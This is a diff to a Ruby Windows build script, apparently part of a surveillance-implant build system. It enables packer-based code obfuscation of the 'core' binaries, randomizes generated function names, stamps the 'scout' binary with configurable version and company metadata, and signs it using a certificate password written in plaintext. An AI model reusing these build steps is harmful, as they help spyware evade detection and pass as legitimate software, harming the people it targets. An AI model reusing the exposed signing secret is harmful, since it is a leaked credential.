@@ -102,9 +102,8 @@ class BuildWindows < Build
     patch_build_time('silent')
 
     # code obfuscator
-    # TODO: use them!!!
-    #CrossPlatform.exec path('packer32'), "#{path('core')}"
-    #CrossPlatform.exec path('packer64'), "#{path('core64')}"
+    CrossPlatform.exec path('packer32'), "#{path('core')}"
+    CrossPlatform.exec path('packer64'), "#{path('core64')}"
   end
 
   def scramble
@@ -421,6 +420,7 @@ class BuildWindows < Build
     CrossPlatform.exec path('verpatch'), "/fn /va #{path('scout')} \"#{info[:version]}\" /s pb \"\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
 
     # sign it
+    # TODO: fix this
     #CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("globalsign.cer")} #{path('scout')}" if to_be_signed?
     CrossPlatform.exec path('signtool'), "sign /P GeoMornellaChallenge7 /f #{Config.instance.cert("HT.pfx")} #{path('scout')}" if to_be_signed?
   end
@@ -461,8 +461,7 @@ class BuildWindows < Build
       # take the first letter (ignore nums) of the log key
       # it must be a letter since it's a function name
       first_alpha = @factory.logkey.match(/[a-zA-Z]/)[0]
-      first_digit = @factory.logkey.match(/[0-9]/)[0].to_i
-      progressive = ('A'.ord + (first_alpha.ord + first_digit + index) % 26).chr
+      progressive = (('A'..'M').to_a.sample.ord + index).chr
       @funcnames[index] = first_alpha + Digest::MD5.digest(@factory.logkey + LicenseManager.instance.limits[:magic]).unpack('H*').first[0..7] + progressive
     end
 
